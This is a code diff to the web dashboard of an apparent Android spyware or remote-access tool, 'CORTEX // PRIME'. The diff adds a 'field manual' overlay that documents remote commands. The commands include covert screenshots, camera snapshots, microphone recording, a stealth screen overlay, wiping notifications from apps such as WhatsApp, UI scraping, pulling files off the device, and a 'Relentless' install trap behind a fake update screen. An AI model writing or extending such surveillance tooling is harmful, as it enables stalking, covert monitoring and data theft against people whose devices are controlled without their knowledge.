@@ -181,6 +181,7 @@
     <header>
         <div class="logo">CORTEX // PRIME</div>
         <div style="display:flex; gap:15px; align-items:center;">
+            <div onclick="showHelpGuide()" style="cursor:pointer; font-size:1.2rem; color:var(--success);" title="SYSTEM GUIDE">❓</div>
             <div onclick="toggleSearch()" style="cursor:pointer; font-size:1.2rem; color:var(--primary);">🔍</div>
             <div id="connectionStatus" class="status-dot"></div>
         </div>
@@ -1302,6 +1303,79 @@
         function toggleAuditData(id) {
             const el = document.getElementById(id);
             el.style.display = el.style.display === 'none' ? 'block' : 'none';
+        }
+
+        function showHelpGuide() {
+            const container = document.getElementById('status-content');
+            document.getElementById('status-title').innerText = "CORTEX // FIELD MANUAL";
+            
+            const sections = [
+                {
+                    cat: "INTERFERENCE",
+                    items: [
+                        { n: "TOAST", p: "[Text]", d: "Simple popup message on device screen." },
+                        { n: "SPEAK (TTS)", p: "[Text] | [Vol 0-100]", d: "Force device to speak text. Uses MEDIA stream volume." },
+                        { n: "RING", p: "[Seconds]", d: "Plays default ringtone for X seconds. Bypasses DND if permitted." },
+                        { n: "WIPE NOTIF", p: "[Mode] | [Value]", d: "ALL: Wipes everything. PKG: Target specific app (e.g. com.whatsapp). TEXT: Target keyword." },
+                        { n: "VOLUME", p: "[Stream] | [Level]", d: "Stream: RING/MEDIA/ALARM. Level: 0-100, SILENT, VIBRATE, or NORMAL." }
+                    ]
+                },
+                {
+                    cat: "SURVEILLANCE",
+                    items: [
+                        { n: "BRIGHTNESS", p: "[0-100] | [Method]", d: "ACC: Transparent black overlay (Stealth). OVERLAY: Standard dim. HARDWARE: Modify system settings." },
+                        { n: "SCREENSHOT", p: "[Quality] | [Freq] | [Dur]", d: "Freq: Seconds between shots (0 = single). Dur: Total session length in SECONDS." },
+                        { n: "OPTICAL", p: "[Side] | [Count]", d: "Side: FRONT/REAR. Count: Number of snapshots to take 1s apart." },
+                        { n: "VOICE", p: "[Seconds]", d: "Record microphone audio for X seconds. Saved as .m4a." },
+                        { n: "GHOST CHAIN", p: "[Sequence]", d: "NAV: BACK/HOME/RECENTS. TAP: X,Y coords. NODE: ViewID or Text match. WAIT: Milliseconds." }
+                    ]
+                },
+                {
+                    cat: "EXTRACTION / FORENSICS",
+                    items: [
+                        { n: "UI SCRAPER", p: "[Pkg] | [Min] | [Depth]", d: "Pkg: App to watch (null = all). Min: Session duration. Depth: How deep to walk UI tree." },
+                        { n: "PUSH FILE", p: "[URL] | [Path]", d: "Downloads file from URL to local path. Use the 📁 icon to stage local files first." },
+                        { n: "PULL FILE", p: "[Full Path]", d: "Uploads specific file from device to the Vault." },
+                        { n: "INSTALL", p: "[APK Path] | [HTML]", d: "Triggers 'Relentless' install trap. HTML is an optional fake update screen." },
+                        { n: "SKELETON", p: "[Depth]", d: "Scans folder structure. Depth 3 = Fast, Depth 10 = Deep." }
+                    ]
+                },
+                {
+                    cat: "MAINTENANCE",
+                    items: [
+                        { n: "STAY READY", p: "[Minutes]", d: "Burst Mode: Keeps foreground service high-priority for X minutes for fast command polling." },
+                        { n: "INTERVAL", p: "[Minutes]", d: "Set frequency of background check-ins. Android min is 15 minutes." },
+                        { n: "FEATURE", p: "[Feat]:[Mode]:[P1]:[P2]", d: "Mode: ON/OFF/SCHED. P1/P2: Minutes (for off) or Start/End times (for sched)." },
+                        { n: "CODE RED", p: "[Code]-[Min]-[Sec]", d: "Crisis loop. Min: Total duration. Sec: Frequency of SMS/Data beacons." }
+                    ]
+                }
+            ];
+
+            container.innerHTML = sections.map(s => `
+                <div style="margin-bottom:25px;">
+                    <h2 style="font-size:0.8rem; background:var(--secondary); color:#fff; width:100%; clip-path:none;">${s.cat}</h2>
+                    ${s.items.map(i => `
+                        <div class="viewer-card" style="margin-bottom:8px;">
+                            <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
+                                <span style="color:var(--primary); font-weight:bold;">${i.n}</span>
+                                <span style="color:var(--success); font-size:0.65rem; font-family:monospace;">${i.p}</span>
+                            </div>
+                            <div style="color:#888; font-size:0.7rem; line-height:1.2;">${i.d}</div>
+                        </div>
+                    `).join('')}
+                </div>
+            `).join('') + `
+                <div class="card" style="border-color:var(--success); background:rgba(0,255,157,0.05);">
+                    <div style="color:var(--success); font-size:0.75rem; font-weight:bold; margin-bottom:5px;">💡 PRO TIPS</div>
+                    <div style="color:#aaa; font-size:0.65rem;">
+                        • Use <b>🏷️ TAG</b> to add custom keywords for the dashboard search (🔍).<br><br>
+                        • Use <b>? STATUS</b> next to a command to see history and extracted data for that specific command type.<br><br>
+                        • <b>TIME UNITS:</b> Most surveillance is in <b>SECONDS</b>. Most maintenance is in <b>MINUTES</b>.
+                    </div>
+                </div>
+            `;
+            
+            document.getElementById('status-overlay').style.display = 'flex';
         }
 
         function toggleSearch() {
